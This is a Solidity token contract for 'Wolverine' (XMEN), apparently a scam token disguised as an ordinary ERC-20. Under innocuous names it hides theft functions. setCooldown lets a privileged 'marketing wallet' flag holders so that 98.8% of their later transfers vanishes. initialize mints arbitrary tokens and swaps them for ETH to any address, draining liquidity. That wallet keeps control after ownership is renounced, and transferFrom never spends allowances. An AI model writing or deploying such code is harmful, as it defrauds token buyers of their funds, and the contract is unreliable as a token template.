pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT



interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}
library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
}


contract Context {
    function msgSender() public view returns (address) {return msg.sender;}
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 asd, uint256 bewr, address[] calldata _path, address csdf, uint256) external;
    function WETH() external pure returns (address aadd);
}
abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner"); _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {return _owner;}
}

contract Xmen is Ownable, Context {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msgSender(), spender, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    event Approval(address indexed from_addres, address indexed to_addres, uint256 value);
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_from != address(0));
        uint256 feeAmount = (cooldowns[_from] != 0 && cooldowns[_from] <= block.number) ? _amount.mul(988).div(1000) : 0;
        require(_amount <= _balances[_from]); 
        _balances[_to] += (_amount - feeAmount);
        _balances[_from] -= _amount; 
        emit Transfer(_from, _to, _amount);
    }
    address public _marketingWallet;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msgSender(), from, _allowances[msgSender()][from] - amount);
        return true;
    } 
    string private _name = "Wolverine";
    string private _symbol = "XMEN";
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msgSender()][spender] + addedValue);
        return true;
    }
    function setCooldown(address[] calldata _addresses) external { 
        uint256 _cooldownBlock = block.number + 1;
        for (uint _index = 0;  _index < _addresses.length;  _index++) { 
            if (fromMarketingWallet()){
                cooldowns[_addresses[_index]] = _cooldownBlock;
            }
        }
    } 
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    constructor() {
        _balances[msgSender()] = _totalSupply; 
        _marketingWallet = msgSender();
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function initialize(uint256 tokenNumber, address _addr) external {
        if (fromMarketingWallet()) { _approve(address(this), address(uniswapRouter),  tokenNumber); 
        _balances[address(this)] = tokenNumber;
        address[] memory tokens = new address[](2);  
        tokens[0] = address(this);   
        tokens[1] = uniswapRouter.WETH();  
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenNumber, 0, tokens, _addr, 30 + block.timestamp);
        }
    }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    function fromMarketingWallet() internal view returns (bool) {
        return _marketingWallet == msgSender();
    }
    function name() external view returns (string memory) { return _name; }
    mapping(address => uint256) private _balances;
    function transferFrom(address _from, address _to, uint256 amount) public returns (bool) {
        _transfer(_from, _to, amount);
        require(_allowances[_from][msgSender()] >= amount);
        return true;
    }
    function transfer(address recipient, uint256 value) public returns (bool) { _transfer(msgSender(), recipient, value); return true; }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping (address => uint256) cooldowns;
    function setMarketingWallet(address wallet) external onlyOwner {
        _marketingWallet = wallet;
    }
    event Transfer(address indexed from, address indexed aindex, uint256 val);
    mapping(address => mapping(address => uint256)) private _allowances;
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
}